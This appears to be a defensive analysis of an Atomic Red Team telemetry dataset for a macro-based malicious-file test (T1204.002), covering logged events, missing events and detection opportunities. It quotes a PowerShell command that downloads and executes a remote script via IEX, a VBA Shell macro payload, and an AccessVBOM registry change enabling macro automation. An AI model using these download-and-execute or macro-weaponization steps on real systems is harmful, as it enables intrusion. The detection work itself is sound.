# T1204.002-3: Malicious File — Maldoc choice flags command execution

## Technique Context

T1204.002 (Malicious File) represents user execution of malicious files, a critical technique in the initial access and execution phases of attacks. Attackers commonly use this technique to deliver payloads through documents with embedded macros, executables disguised as legitimate files, or other file types that require user interaction to execute. This specific test simulates a malicious Word document containing VBA macros that execute the `choice` command through a shell call. In real attacks, this technique often serves as the entry point for further compromise, making it a high-priority detection target for security teams. Detection engineers focus on identifying suspicious macro execution, unexpected child processes from Office applications, and unusual command-line patterns that indicate macro-based execution.

## What This Dataset Contains

This dataset captures a failed attempt to execute a malicious Word document simulation. The PowerShell script block in EID 4104 shows the complete attack chain: downloading the Invoke-MalDoc.ps1 script from GitHub (`IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)`) and attempting to create a Word document with VBA macro code that executes `cmd.exe /c choice /C Y /N /D Y /T 3`. The PowerShell logs reveal the failure point - the attempt to instantiate a Word COM object fails with error "Class not registered (Exception from HRESULT: 0x80040154 (REGDB_E_CLASSNOTREG))" because Microsoft Office is not installed on the test system. Security event 4688 captures the PowerShell process creation with the full command line, while Sysmon EID 1 events show process creation for whoami.exe and the child PowerShell process. DNS query logs in Sysmon EID 22 show the resolution of "raw.githubusercontent.com" for the script download. The dataset includes extensive Windows Defender DLL loading events (MpOAV.dll, MpClient.dll) indicating active real-time protection monitoring.

## What This Dataset Does Not Contain

The dataset lacks the actual malicious document creation and macro execution because Microsoft Office/Word is not installed on the test system, causing the COM object instantiation to fail. There are no Office application processes, no document file creation events, no actual VBA macro execution, and no cmd.exe process spawning from the intended `choice` command. The technique fails at the Word application launch stage, so subsequent behaviors like Office child process creation, macro warning dialogs, or the actual shell command execution are absent. Additionally, there are no network connections to external command and control infrastructure that would typically follow successful macro execution in real attacks.

## Assessment

This dataset provides limited value for detecting successful T1204.002 execution because the core technique fails due to missing Office software. However, it offers excellent telemetry for detecting the preparation phase of macro-based attacks. The PowerShell script block logging captures the complete attack methodology, including the external script download and the intended macro payload. The comprehensive process creation logging and DNS query monitoring demonstrate strong detection coverage for the reconnaissance and setup phases. While this specific execution fails, the telemetry patterns would be highly valuable for detecting similar attacks that attempt to dynamically download and execute malicious document creation tools. The failure mode itself could be useful for identifying attempted attacks on systems lacking Office installations.

## Detection Opportunities Present in This Data

1. **External script download for document weaponization** - PowerShell EID 4103 shows `Invoke-WebRequest` downloading from raw.githubusercontent.com with atomic red team paths, indicating potential malicious document creation tools
2. **Suspicious PowerShell macro creation patterns** - Script block contains VBA syntax `Shell("cmd.exe /c choice...")` and `Invoke-MalDoc` function calls characteristic of document weaponization
3. **COM object instantiation attempts for Office applications** - PowerShell error logs show attempts to create Word.Application COM objects, indicating potential malicious document automation
4. **Registry manipulation for VBA access** - PowerShell attempts to set `AccessVBOM` registry key in Office security settings to enable programmatic VBA access
5. **Process ancestry anomalies** - PowerShell spawning child PowerShell processes with suspicious command-line arguments containing escaped quotes and VBA-like syntax
6. **DNS queries to code repositories during PowerShell execution** - Sysmon EID 22 showing raw.githubusercontent.com queries correlated with suspicious PowerShell activity
7. **Failed Office automation attempts** - PowerShell error messages about missing COM classes can indicate attempted malicious document creation on systems without Office
